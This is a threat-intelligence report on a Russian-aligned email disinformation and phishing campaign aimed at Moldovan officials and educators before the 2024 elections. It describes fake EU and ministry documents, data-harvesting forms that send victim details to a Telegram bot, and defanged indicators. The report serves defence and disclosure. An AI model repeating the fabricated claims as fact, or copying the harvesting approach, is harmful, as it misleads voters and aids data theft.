Operation MiddleFloor: Disinformation campaign
targets Moldova ahead of presidential elections and
EU membership referendum
⋮ 10/9/2024
	October 9, 2024
Introduction
Beginning in early August, Check Point Research observed a cyber-enabled disinformation campaign primarily
targeting Moldova’s government and education sectors. Acting ahead of Moldova’s elections on October 20th,
attackers behind this campaign likely seek to foster negative perceptions of European values and the EU
membership process in addition to Moldova’s current pro-European leadership, with the intent of influencing the
outcome of the upcoming fall elections and national referendum.
Following the start of the Russian-Ukrainian war, Moldova, a former Soviet republic, was granted EU candidate status
in 2022. A nationwide referendum will be held on October 20, 2024, simultaneously with the presidential election, to
determine whether the constitution should be amended to reflect the citizens’ desire for EU membership. Incumbent
president Maia Sandu is actively campaigning for EU membership.
In this blog, we analyze the techniques used by the threat actors, whom we track as Lying Pigeon, in their
disinformation campaign in Moldova and provide an overview of their different activity clusters in other parts of
Europe in the last few years.
Key findings
Operation MiddleFloor is an ongoing disinformation campaign against Moldovan targets that began in early
August. It uses emails as the primary distribution method instead of more common methods such as social
networks or fake websites.
While the campaign disseminates fake emails and documents, it also aims to gather information on the
victims’ environments, likely to set the stage for targeted malware attacks.
The threat actors use spoofed email accounts to disseminate content allegedly originating from European
Union institutions, Moldavian ministries, or political figures.
This campaign exploits multiple sensitive topics and fears related to the current pro-European government
and Moldova’s potential EU membership. These include concerns about gas supply and fuel prices ahead of
winter, LGBT, potential stringent anti-corruption measures, changes in the education system, immigration from
the Middle East, and general labor market shifts across Moldova and EU countries.
The actors behind this campaign are Russian-speaking and not fully proficient in English. Based on the
Tactics, Techniques, and Procedures (TTPs), targeting, and distributed messages, Lying Pigeon appears to be
aligned with Russian interests.
We linked Lying Pigeon to previously unattributed clusters of activity across Europe. Since early 2023, Lying
Pigeon activity has been observed in several European locations related to the following themes:
2/21
NATO 2023 summit in Vilnius.
2023 general elections in Spain, spreading disinformation about an alleged upcoming terrorist attack.
Polish cybersecurity scene, topics such as freedom of the press, and others.
According to CERT Polska, the actor they track as APT-UNK2 with substantial overlaps with Lying
Pigeon, was also responsible for distributing infostealers in Poland and staging fake websites.
Operation MiddleFloor: email-based information campaign
Operation MiddleFloor is an anti-European and anti-government disinformation campaign targeting Moldova that
primarily relies on emails to distribute its messages and gathers additional data from its targets. This approach is
noteworthy because it diverges from the more common strategies seen in disinformation campaigns, such as the
infamous Operation Doppelganger, which created fake versions of news websites and published misleading articles
spreading pro-Russian narratives while leveraging social media to reach larger audiences quickly.
By using email-based communications, the operation can directly target individuals. Given the private nature of email,
monitoring and counteracting the disinformation effectively becomes more difficult. Emails that seem to originate from
trustworthy sources appear more legitimate to recipients, enhancing the credibility of the disinformation and making it
easier for individuals to interact with it by clicking links, providing information, or entering personal details —and
engage with the threat actors’ infrastructure.
Despite these advantages, the reach of email-based campaigns is limited, as emails rarely go viral compared to
content shared on social media platforms. Additionally, the infrastructure behind email communications is more
traceable, allowing authorities to track down the sources of disinformation more efficiently and take appropriate action
against them.
Figure 1 – Key Operation MiddleFloor activities (as of October 1st).
Fake official European documents and forms
One of the first waves in this campaign, which occurred in early August 2024, involved the distribution of a fake PDF
document aimed at Moldavian civil servants and individuals in state positions.
The document, allegedly sent by the European Commission, outlines the measures and rules that Moldavian officials
must comply with once the nation becomes a member of the European Union, including:
The requirement to undertake an English language exam using the IELTS system and to hold a master’s
degree in public administration.
3/21
A recommendation to raise the LGBT flag at Ministry buildings on 12 LGBT-related days throughout the year.
Figure 2 – The first two pages of the fake document sent to Moldavian officials.
While this document is falsified and does not reflect any actual requirements for EU members or candidate countries,
the last page provides a fake email address of a genuine EU Commission expert and a feedback form (both hosted
on the same malicious domain europa[.]study):
Figure 3 – Means to provide feedback (and therefore engage with the threat actors)
provided in the disinformation document.
Another fraudulent document, designed to appear as if it was from the European Public Prosecutor’s Office (EPPO),
targets Moldovan officials, specifically those in the judicial system:
4/21
Figure 4 – Disinformation document claiming to be from the EPPO.
The document requests personal details and information about the commercial activities of close family members
under the guise of adhering to the EU anti-corruption regulations. The data is supposed to be submitted via the form
on the attacker-controlled domain impersonating EPPO, europa-eppo[.]eu. The document is not located on the
actual EPPO document repository, does not follow the EPPO document template, and contains grammatical mistakes
(such as “august” written in lowercase), indicating an obvious fake.
Victim data collection
All the fake forms have very similar code and a similar look.
Figure 5 – Example of the first pages of the form on malicious europa-eppo[.]eu site.

The HTML of these forms loads an additional script, index.js: <script src="index.js"></script>
which collects the following data:
All content entered in the fields from the form.
The user-agent of the victim using window.navigator.userAgent.
Data on the victims’ IP address retrieved by requesting https://ipapi.co/json/.
It then sends this data in a POST request to script.php and redirects the victim to a “form is successfully
submitted” page.

After the data is submitted to the server, it returns a JSON response that indicates the data was successfully sent to a
Telegram bot with the name setsetinbot and the title set:
Figure 6 – Response from script.php after the collected data was sent to the attackers,
The data gathered about the victim’s environment is not highly detailed. Still, combined with the personal information
provided in the form, it could facilitate more targeted attacks, potentially including drive-by attacks. Threat actors may
exploit the victim’s vulnerability to spear-phishing campaigns, especially as they have already interacted with the
threat actors’ infrastructure.

Fake Migration policy changes
In early September, several organizations and institutions in the Republic of Moldova, including those from the
education sector, received an email with an alleged “resolution” from the Ministry of Labor and Social Protection, with
information about “changes in the migration policy.”

The attached fake document contains content about “strengthening measures to attract migrants from the Middle
East to compensate for the losses on the labor market due to the large migration flow from Moldova.” Among other
claims, it states that the percentage of migrants in every organization must be at least 30%, that new mosques will be
built in every region of the country, and that a simplified process for obtaining citizenship will be implemented for
migrants employed by Moldovan companies. Moldovan officials confirmed that the document is fake.

Fake increase in gas prices and supply interruptions
Another troubling issue being exploited by the threat actors is the topic of gas prices for the upcoming winter. In mid-
September, an email claiming to be from the Ministry of Energy stated that gas prices would increase and that
planned interruptions to the natural gas supply would occur during the winter:

The Ministry of Energy already reported this message as disinformation. Despite attempts to make their emails
appear legitimate, the threat actors confused the name of the General Secretary of the Ministry of Energy, Andrei
Grițco, with that of the State Secretary within the Ministry of Energy, Cristina Pereteatcu.
Fake EU education values
Among the emails sent by the threat actors, some lacked attachments. One of these emails impersonated a member
of the European Commission Cabinets using the spoofed domain europa-ec[.]eu and was sent to more than 80
recipients at one of the most prestigious universities in Europe:
Figure 10 – A disinformation email regarding changes in the education system.
The email claims to promote a pro-European message, using the current president, Maia Sandu, as a source of
inspiration, but spreads disinformation about European education values and standards. For example, deliberately
lowering student grades to encourage academic growth is not accepted in European education policy or discourse.
The email also features false restrictions on job opportunities for low-performing students and misleading
requirements for working abroad within the EU. All these claims contradict the EU’s education policies, prioritizing
equity, inclusion, and fairness.
14/21
The second wave of disinformation emails targeting employees of education institutions was sent on September 24
from a fake email domain impersonating the Moldovian Ministry of Education and Research. The emails contained
PDF titled Privind aprobarea Programului ambasadorilor UE.pdf (“Regarding the approval of the EU
Ambassador Program”). The PDF included a picture of the alleged official order from the Ministry, with content
primarily focused on topics such as sex education and non-binary genders in context of educational institutions
integration into the European Union.
Attribution
The email mentioned above about European education values was written in English yet contains some structural
errors that suggest it was translated from another language. These include phrases such as “has already addressed
to you” and “instill tolerance to all genders”, which are likely literal translations of those phrases from Russian.
The email’s first numbered point, which addresses gender equality, refers to “toilets for the middle floor”, a phrase
that does not make sense in English. This is a literal translation from the Russian phrase «туалеты для среднего
пола», meaning gender-neutral toilets.
Another argument supporting the Russian-speaking origins of Lying Pigeon is the metadata of both PDF documents
which are purportedly from European institutions.
Figure 11 – Metadata of Letter_Directorate-General for Neighbourhood and Enlargement Negotiations.pdf (left)
and Notification.pdf (right) PDFs impersonating the EU institutions.
Both list ru-RU for Language metadata, meaning that the document was created using the Russian language local or
regional setting. The document metadata lists UTC+3 for the time zone. A segment of the Moldavan population
speaks Russian, and in August, the Moldavan time zone corresponds to UTC+3 due to Daylight Saving time; in
addition, parts of Russia and Belarus, and some other countries in Eastern Europe, the Middle East, and Africa
are located in the UTC+3 time zone.
Lying Pigeon infrastructure and past activity
Over the course of Operation MiddleFloor, the threat actors used a few domain name registrars to register the
domains that spoof European and Moldovan entities:
Zone Media OÜ [Zone.EU] impersonates European Union entities, such as europa-eppo[.]eu.
NameCheap and Realtime Register B.V. for more generic domains such as gov-md[.]com.
Starting in September, the threat actors registered domains in .MD zone to impersonate Moldovan entities,
such as energie-gov[.]md, for greater legitimacy.
All the domains and IP addresses used in this campaign are interconnected, enabling us to attribute these seemingly
different techniques and messages to the same operation.
15/21
Figure 12 – Maltego graph of the MiddleFloor infrastructure.
All the servers used in this campaign can be classified into two categories:
Shared VPS on AS 200313 (IT WEB LTD) – For domain resolutions and hosting the forms. This hosting
provider is often used by multiple threat actors to conduct malicious activities.
Dedicated mail servers – Hosted mostly on BlueVPS, the actors started to use OVH servers only since
September 23. In the first half of the campaign, the threat actors used the email
server mail.mailogon[.]online for a few different domains.
The threat actors use Mailcow, an open-source mail server suite, to host their own servers for anonymity and greater
flexibility and to manage and scale their operations.

Figure 13 – Screenshot from censys.io showing the email servers used by the threat actors (as of October 1st).
Connection to earlier activities
On August 6, one of the early domains related to Operation MiddleFloor, europa[.]study, and its Sogo subdomain
was temporarily resolved to 185.255.132[.]69 hosted on AS 204997 (First Server Limited).
Figure 14 – DNS resolutions of europa[.]study.
In the period of November 2023 – March 2024, this IP also hosted another cluster of domains:

otllook[.]com, sapsap[.]site (also autoconfig.sapsap[.]site and
autodiscover.sapsap[.]site), te-storg[.]com (also autoconfig.te-storg[.]com and
autodiscover.te-storg[.]com), mailorun[.]su (also mail.mailorun[.]su,
autodiscover.mailorun[.]su and autoconfig.mailorun[.]su).
We determined that this cluster likely belongs to the same threat actors responsible for the MiddleFloor operation due
to the following reasons:
Judging by the certificates, all these “old” domains belong to the same actor.
No other activity has been observed on this IP address since then.
The IP address 185.255.132[.]69 hosted an email server with a similar Mailcow and Let’s Encrypt
certificate setup.
One of these domains, mailorun[.]su, mimics Mailgun; the MiddleFloor campaign also used the
domain mailgon[.]online.
Most of these domains – otllook[.]com, mailorun[.]su, and te-storg[.]com – are registered with the same
email address: gotohends@inbox[.]eu. In addition, over time, a few more domains were registered with this same

This set of domains creates multiple additional pivot points, such as the IP address 45.133.148[.]35 and shared
mail server, mail.mailos[.]ru.
Based on these domains and their pivots, we identified a few additional clusters of Lying Pigeon’s previous activity.
We suspect that those domains that are resolved to specific IP address, have an SPF record an MX record pointing
to the same IP, were likely meant to send spoofed emails.

2023 General Elections in Spain
The Spanish general election to elect members of the Congress of Deputies and the Senate, which comprise the
country’s legislative parliament was held on July 23, 2023. Pivoting on existing domains and IP addresses, this
cluster of activity includes the following domains, all of whom existed around the election date:

The last two domains were observed as part of a disinformation campaign discovered by QuoIntelligence. This
campaign was targeting Russian-speaking communities in Spain the day before the elections with Telegram
messages that linked to a fake website mimicking the website of the Community of Madrid. The fake website
contained a warning from the Ministry of Interior about a planned series of attacks by the ETA, a Basque separatist
organization. The message encouraged recipients to skip voting in the elections to avoid risking their lives.
QuoIntelligence researchers also noted that the campaign used fewer delivery methods (e.g., no email-based vectors
or massive social media campaigns) to spread the message. We suspect that the first domain in this cluster,
comunicacion-presidencia-gov[.]es, which contains MX records pointing to the mail server mail.mailos[.]ru at
the same time, might have been used for email-based attacks, but as of now do not have any firm evidence.

The CERT Polska report:
CERT Polska reported that the threat actor they track as APT-UNK2 carried out a campaign involving the
impersonation of NASK (a Polish research and development organization, data networks operator, and internet
domain name registry operator for the .pl country-level top-level domain). The campaign used the domain nask-
pl[.]com to distribute emails, which contained an attachment that included a PDF
(md5: cff5b518a247756febc43386ad1ecc88) with instructions and a Dropbox link for installing
malicious Network_CPP_Shield.msi (md5: 609c677a134efac42bfefe6d58451caf). Victims’ machines were
infected with the Lumma Infostealer.

Some interesting patterns we observed:
Domains sso-log[.]com and pass-check[.]online (pivoted on the same IP addresses during the same
timeframe): Judging by their names, we assume these are for use in web-based credential phishing attacks.
Domain nnmnnm[.]ru which also has the same email server mailos[.]ru, and noname05716[.]ru which
was resolved to the same IP address as mailos[.]ru in the same timeframe. Both refer to the
infamous Noname057(16) pro-Russian hacktivist group, which is known for its DDoS attacks against NATO
countries. As the group never mentioned their sites in their public communications, it’s unclear what
relationship, if any, exists between Lying Pigeon and Noname057(16).
Conclusion
The disinformation campaign led by Lying Pigeon represents a significant and ongoing threat to the political stability
of the Republic of Moldova, particularly as the campaign seeks to influence the outcomes of both national elections
and the EU membership referendum. Our investigation also connected Lying Pigeon to previous election interference
activities in Spain in 2023, highlighting their persistent involvement in undermining European democratic processes.
Additionally, this group has been active around major European events, such as the NATO summit and the European
Economic Forum, likely using these high-profile occasions to further their disinformation efforts.
Beyond their influence operations, Lying Pigeon likely uses their campaigns to distribute infostealer malware and
collect sensitive information for future targeted attacks. This dual approach of combining disinformation with
information harvesting underscores the sophisticated and multifaceted nature of Lying Pigeon’s operations, making
them a critical threat actor to monitor in the ongoing struggle to protect democratic integrity and ensure cybersecurity
in Europe.
